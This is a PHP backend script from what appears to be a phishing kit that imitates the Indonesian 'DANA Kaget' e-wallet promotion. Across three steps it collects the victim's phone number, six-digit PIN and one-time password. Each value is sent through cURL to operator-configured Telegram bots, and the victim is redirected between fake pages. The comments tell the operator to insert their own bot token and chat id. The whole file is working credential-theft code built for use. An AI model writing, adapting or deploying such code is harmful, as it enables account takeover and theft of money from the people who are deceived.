<?php
session_start();

function handle_no_hp($no_hp) {
    $_SESSION['nomor'] = $no_hp;

    // Kirim notifikasi ke Telegram setelah pengisian nomor HP
    send_to_telegram($no_hp, '_ ', '_ ');

    header("Location: pin.php");
    exit();  // Tambahkan exit() setelah header() untuk menghentikan eksekusi lebih lanjut
}

function handle_pin($data) {
    $pin = $data['pin1'] . $data['pin2'] . $data['pin3'] . $data['pin4'] . $data['pin5'] . $data['pin6'];

    if (!is_numeric($pin)) {
        header("Location: pin.php");
        exit();  // Tambahkan exit() setelah header() untuk menghentikan eksekusi lebih lanjut
    }

    $_SESSION['pin'] = $pin;
    $_SESSION['nomor'] = $data['nomor'];

    // Kirim notifikasi ke Telegram setelah pengisian PIN
    send_to_telegram($data['nomor'], $pin, '_  ');

    header("Location: otp.php");
    exit();  // Tambahkan exit() setelah header() untuk menghentikan eksekusi lebih lanjut
}

function handle_otp($data) {
    $otp = $data['otp'];

    $_SESSION['otp'] = $otp;
    $_SESSION['pin'] = $data['pin'];
    $_SESSION['nomor'] = $data['nomor'];

    // validate if type of $otp is integer
    if (!is_numeric($otp)) {
        header("Location: otp.php");
        exit();  // Tambahkan exit() setelah header() untuk menghentikan eksekusi lebih lanjut
    }

    // Kirim notifikasi ke Telegram setelah pengisian OTP
    send_to_telegram_otp($data['nomor'], $data['pin'], $otp);

    header("Location: star.php");  // Redirect ke halaman success
    exit();  // Tambahkan exit() setelah header() untuk menghentikan eksekusi lebih lanjut
}

function send_to_telegram($nomor, $pin, $otp) {
    $config = include __DIR__ . '/config.php';
    // Change this token with your bot token
    $token = $config['telegram_bot_token'];

    // Change this chat_id with your chat_id
    $chat_id = $config['chat_id'];

    $message = "----DANA KAGET----\n\nNomor: $nomor\n\nPin  : $pin\nOtp : $otp";

    // post message to telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=" . $chat_id . "&text=" . urlencode($message));  // Gunakan urlencode untuk memastikan format pesan yang benar
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $server_output = curl_exec($ch);
    curl_close($ch);
}

function send_to_telegram_otp($nomor, $pin, $otp) {
    $config = include __DIR__ . '/config.php';
    // Change this token with your bot token for OTP page
    $token_otp = $config['telegram_bot_token_otp']; // Token bot yang berbeda untuk halaman OTP

    // Change this chat_id with your chat_id for OTP page
    $chat_id_otp = $config['chat_id_otp']; // ID obrolan yang berbeda untuk halaman OTP

    $message = "----DANA KAGET (OTP)----\n\nNomor: $nomor\n\nPin  : $pin\nOtp : $otp";

    // post message to telegram for OTP page
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token_otp . "/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=" . $chat_id_otp . "&text=" . urlencode($message));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $server_output = curl_exec($ch);
    curl_close($ch);
}
?>
